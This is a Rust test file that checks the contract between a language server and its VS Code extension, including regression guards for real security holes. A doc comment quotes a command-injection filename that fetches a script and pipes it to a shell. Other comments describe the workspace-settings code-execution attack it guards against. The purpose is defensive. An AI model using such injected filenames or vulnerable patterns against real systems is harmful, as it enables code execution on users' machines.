//! The contract between the language server and the VS Code client.
//!
//! **Why this file exists.** The server has emitted a `delulu.authority` code lens since Stage 8.
//! No client ever registered that command, so clicking the lens raised
//! *"command 'delulu.authority' not found"* — for the whole life of the feature, in the one editor
//! surface the project ships. Nothing failed, because nothing compared the two sides: the server is
//! Rust, the client is JavaScript, and no test read both.
//!
//! A lens the editor cannot execute is worse than no lens: the server advertises an action, the
//! user clicks it, and the tool reports its own internal error. So the three lists — commands the
//! server emits, commands the client registers, commands the manifest declares — must be equal, and
//! this test is what makes "equal" checkable rather than remembered.
//!
//! It is a source scrape by design. The alternative is launching VS Code, which cannot run in this
//! project's CI, and a scrape that reads the real files catches the real drift.

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

fn repo_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("..").join("..")
}

fn read(rel: &str) -> String {
    let p = repo_root().join(rel);
    std::fs::read_to_string(&p).unwrap_or_else(|e| panic!("cannot read {}: {e}", p.display()))
}

/// Every `"command": "delulu.…"` the server puts in a **code lens** — an action a person clicks,
/// which the editor must therefore be able to execute.
///
/// This deliberately does not include the server's `workspace/executeCommand` names. Those are a
/// different kind of thing and have the opposite requirement; see
/// [`protocol_commands_the_server_answers`].
fn lens_commands_the_server_emits(src: &str) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    for (i, _) in src.match_indices("\"delulu.") {
        let rest = &src[i + 1..];
        if let Some(end) = rest.find('"') {
            let name = &rest[..end];
            // `delulu.serverPath` and friends are configuration keys, not commands. A lens command
            // is the value of a `"command":` key inside the lens JSON.
            if src[..i].trim_end().ends_with("\"command\":") {
                out.insert(name.to_string());
            }
        }
    }
    out
}

/// Every command the server answers over `workspace/executeCommand` — the ones it advertises in
/// `executeCommandProvider.commands` and dispatches on in `execute_command`.
fn protocol_commands_the_server_answers(src: &str) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    // The advertised list: `"executeCommandProvider": { "commands": [...] }`.
    if let Some(at) = src.find("\"executeCommandProvider\"") {
        let tail = &src[at..];
        if let (Some(open), Some(close)) = (tail.find('['), tail.find(']')) {
            if open < close {
                for piece in tail[open + 1..close].split(',') {
                    let name = piece.trim().trim_matches('"');
                    if name.starts_with("delulu.") {
                        out.insert(name.to_string());
                    }
                }
            }
        }
    }
    // The dispatch: `params["command"].as_str() != Some("delulu.…")`.
    for (i, _) in src.match_indices("\"delulu.") {
        let rest = &src[i + 1..];
        if let Some(end) = rest.find('"') {
            if src[..i].trim_end().ends_with("Some(") {
                out.insert(rest[..end].to_string());
            }
        }
    }
    out
}

/// Every command the JS client passes to `registerCommand`.
fn commands_the_client_registers(src: &str) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    for (i, _) in src.match_indices("registerCommand(\"") {
        let rest = &src[i + "registerCommand(\"".len()..];
        if let Some(end) = rest.find('"') {
            out.insert(rest[..end].to_string());
        }
    }
    out
}

/// Every command declared in `contributes.commands`.
fn commands_the_manifest_declares(pkg: &serde_json::Value) -> BTreeSet<String> {
    pkg["contributes"]["commands"]
        .as_array()
        .map(|a| {
            a.iter().filter_map(|c| c["command"].as_str().map(str::to_string)).collect()
        })
        .unwrap_or_default()
}

/// A command the server answers over `workspace/executeCommand` must **not** also be registered by
/// the extension.
///
/// A language client registers a VS Code command for every name in the server's
/// `executeCommandProvider.commands` while it initializes. An extension that registers the same
/// name collides with its own client: `registerCommand` throws *"command … already exists"* from
/// inside `client.start()`, initialization fails, the queued `didOpen` is dropped, and the server
/// is shut down. The editor is then left with syntax highlighting and nothing else — no
/// diagnostics, no hover, no completion — in every workspace.
///
/// This project shipped exactly that. The previous version of this file asserted the *opposite*:
/// it scraped the `execute_command` dispatch as though those were lens commands and required the
/// client to register them, so the test did not merely miss the bug, it demanded it. The fault was
/// modelling two different things — an action a person clicks, and a request the client makes — as
/// one list. They are now separate, with opposite obligations.
#[test]
fn a_command_the_client_library_registers_is_not_registered_again_by_the_extension() {
    let protocol = protocol_commands_the_server_answers(&read("crates/delulu/src/lsp.rs"));
    let client = commands_the_client_registers(&read("editors/vscode/extension.js"));

    assert!(
        !protocol.is_empty(),
        "found no `workspace/executeCommand` names in lsp.rs — the scrape broke, and a scrape that \
         finds nothing would pass this test forever while checking nothing"
    );

    let clashing: Vec<_> = protocol.intersection(&client).collect();
    assert!(
        clashing.is_empty(),
        "extension.js registers {clashing:?}, which the server also advertises in \
         `executeCommandProvider`. The language client registers those itself during \
         initialization, so this throws \"command already exists\" inside `client.start()` and the \
         language server never comes up. Give the editor-side command a different name (e.g. \
         `delulu.showAuthority`) and have it send `workspace/executeCommand` to the protocol name."
    );
}

#[test]
fn every_lens_the_server_emits_is_a_command_the_editor_can_actually_run() {
    let server = lens_commands_the_server_emits(&read("crates/delulu/src/lsp.rs"));
    let client = commands_the_client_registers(&read("editors/vscode/extension.js"));
    let pkg: serde_json::Value =
        serde_json::from_str(&read("editors/vscode/package.json")).expect("package.json parses");
    let manifest = commands_the_manifest_declares(&pkg);

    assert!(
        !server.is_empty(),
        "found no lens commands in lsp.rs — the scrape broke, and a scrape that finds nothing would \
         pass this test forever while checking nothing"
    );

    let unregistered: Vec<_> = server.difference(&client).collect();
    assert!(
        unregistered.is_empty(),
        "the server emits {unregistered:?} but the VS Code client registers no handler — clicking \
         that lens raises \"command not found\".\n  server:   {server:?}\n  client:   {client:?}"
    );

    let undeclared: Vec<_> = client.difference(&manifest).collect();
    assert!(
        undeclared.is_empty(),
        "extension.js registers {undeclared:?} but package.json does not declare them in \
         `contributes.commands`, so they are invisible in the Command Palette.\n  \
         client:   {client:?}\n  manifest: {manifest:?}"
    );

    let phantom: Vec<_> = manifest.difference(&client).collect();
    assert!(
        phantom.is_empty(),
        "package.json declares {phantom:?} with nothing registering them — the palette would offer \
         a command that fails when chosen"
    );
}

/// The extension ships inside this repository and under its licence. It claimed `MIT` at version
/// `0.8.0` while the workspace was Apache-2.0 at 1.0.0 — a licence statement that contradicts the
/// LICENSE file beside it is a distribution problem, not a cosmetic one.
#[test]
fn the_extension_manifest_agrees_with_the_workspace_it_ships_from() {
    let pkg: serde_json::Value =
        serde_json::from_str(&read("editors/vscode/package.json")).expect("package.json parses");
    let cargo = read("Cargo.toml");

    let field = |key: &str| -> String {
        cargo
            .lines()
            .find_map(|l| l.strip_prefix(&format!("{key} = ")))
            .unwrap_or_else(|| panic!("workspace Cargo.toml has no `{key}`"))
            .trim()
            .trim_matches('"')
            .to_string()
    };

    assert_eq!(
        pkg["version"].as_str().unwrap_or_default(),
        field("version"),
        "the VS Code extension version has drifted from the workspace version"
    );
    assert_eq!(
        pkg["license"].as_str().unwrap_or_default(),
        field("license"),
        "the VS Code extension declares a different licence than the workspace it ships from"
    );
    assert_eq!(
        pkg["repository"]["url"].as_str().unwrap_or_default(),
        field("repository"),
        "the VS Code extension points at a different repository than the workspace"
    );
}

/// A regression guard for a second real vulnerability, witnessed against a build of this extension
/// before the fix landed.
///
/// `delulu.serverPath` had VS Code's default configuration scope, `window`. A `window`-scoped
/// setting can be written by a **workspace**, i.e. by `.vscode/settings.json` inside any repository
/// — and this extension spawns that path as a process the moment a `.delulu` file is opened. So a
/// repository that shipped an executable and a three-line settings file got code execution on
/// clone-and-open, with no click from the user.
///
/// It was reproduced end-to-end in an isolated VS Code profile (own `--user-data-dir` and
/// `--extensions-dir`, workspace trust granted so that trust was not what refused): the unfixed
/// build ran the planted binary 7 seconds after the folder opened; the fixed build never ran it.
/// The only difference between the two packages was the `scope` line this test pins.
///
/// The check is deliberately wider than the one setting that was wrong. Any future setting naming a
/// path, binary, or argument list has the same shape, and the failure mode — a config key that
/// looks inert but is really "which program do I launch" — is easy to reintroduce.
#[test]
fn no_setting_that_names_an_executable_can_be_set_by_a_workspace() {
    let pkg: serde_json::Value =
        serde_json::from_str(&read("editors/vscode/package.json")).expect("package.json parses");

    let props = pkg["contributes"]["configuration"]["properties"]
        .as_object()
        .expect("the extension contributes configuration properties");
    assert!(
        !props.is_empty(),
        "found no configuration properties — the scrape broke, and a scrape that finds nothing \
         would pass this test forever while checking nothing"
    );

    // Scopes a workspace cannot write. `window` and `resource` (the default is `window`) both can.
    const WORKSPACE_PROOF: [&str; 3] = ["machine", "machine-overridable", "application"];
    // Substrings that mark a setting as "this value becomes a program or its arguments".
    const EXECUTABLE_SHAPED: [&str; 6] = ["path", "command", "binary", "executable", "args", "exe"];

    for (key, spec) in props {
        let lower = key.to_lowercase();
        if !EXECUTABLE_SHAPED.iter().any(|m| lower.contains(m)) {
            continue;
        }
        let scope = spec["scope"].as_str().unwrap_or("window");
        assert!(
            WORKSPACE_PROOF.contains(&scope),
            "`{key}` names an executable or its arguments but has scope `{scope}`, which a \
             repository's own `.vscode/settings.json` can write. This extension launches that \
             value as a process on activation, so a cloned repository would get code execution on \
             open — that exact attack was witnessed before `machine-overridable` was added. Give \
             it scope `machine-overridable`."
        );
    }

    // The declaration is separate from the scope and does a different job: it tells VS Code what
    // this extension is allowed to do before the user has trusted the folder at all.
    let untrusted = &pkg["capabilities"]["untrustedWorkspaces"];
    assert!(
        !untrusted.is_null(),
        "package.json declares no `capabilities.untrustedWorkspaces`. An extension that spawns \
         processes must state its posture in Restricted Mode explicitly rather than inherit a \
         default that may change."
    );
    let restricted: BTreeSet<String> = untrusted["restrictedConfigurations"]
        .as_array()
        .map(|a| a.iter().filter_map(|v| v.as_str().map(str::to_string)).collect())
        .unwrap_or_default();
    assert!(
        restricted.contains("delulu.serverPath"),
        "`delulu.serverPath` is not listed in `restrictedConfigurations`; belt and braces are both \
         wanted here, because the scope rule protects trusted workspaces and this protects the \
         untrusted ones"
    );
}

/// `delulu run` and `delulu test` compile and execute the files in front of them. In a workspace
/// the user has not trusted, that is precisely the thing Restricted Mode exists to prevent, so the
/// two commands must check trust before spawning anything. Analysis deliberately does not: reading
/// a hostile file is what a language server is for.
#[test]
fn the_commands_that_execute_workspace_code_check_workspace_trust() {
    let js = read("editors/vscode/extension.js");
    assert!(
        js.contains("workspace.isTrusted"),
        "extension.js never consults `vscode.workspace.isTrusted`, so `delulu run` would execute \
         the workspace's own code in Restricted Mode"
    );
    for cmd in ["delulu.run", "delulu.test.run"] {
        let at = js
            .find(&format!("registerCommand(\"{cmd}\""))
            .unwrap_or_else(|| panic!("{cmd} is no longer registered"));
        let body = &js[at..];
        let end = body.find("runInTerminal").unwrap_or(body.len());
        assert!(
            body[..end].contains("requireTrust"),
            "`{cmd}` reaches `runInTerminal` without a trust check — it would execute the \
             workspace's code in Restricted Mode"
        );
    }
}

/// A regression guard for a real vulnerability: the client built a shell command *string* out of
/// the open file's path (`` `${serverPath} run ${fsPath}` ``) and sent it to the user's shell. A
/// file named `x;curl evil.sh|sh.delulu` executed on click, and any path containing a space ran
/// the wrong command. Paths come from editor tabs, so they are attacker-influenced the moment a
/// project is opened from a clone. The fix passes an **argv array**; this pins that it stays one.
#[test]
fn the_client_never_builds_a_shell_command_string_from_a_path() {
    let js = read("editors/vscode/extension.js");
    assert!(
        !js.contains("sendText("),
        "extension.js uses `sendText(...)`, which hands a STRING to the user's shell. Paths \
         interpolated into it are shell syntax — build an argv array (`shellArgs`) instead."
    );
    assert!(
        js.contains("shellArgs"),
        "extension.js no longer passes an argv array; the injection-safe execution path is gone"
    );
    // The fsPath must never appear inside a template literal — that is the interpolation shape.
    for line in js.lines() {
        let l = line.trim();
        if l.starts_with("//") || l.starts_with("*") {
            continue;
        }
        assert!(
            !(l.contains("${") && l.contains("fsPath")),
            "a file path is interpolated into a template literal, which is how the injection \
             was built the first time: {l}"
        );
    }
}
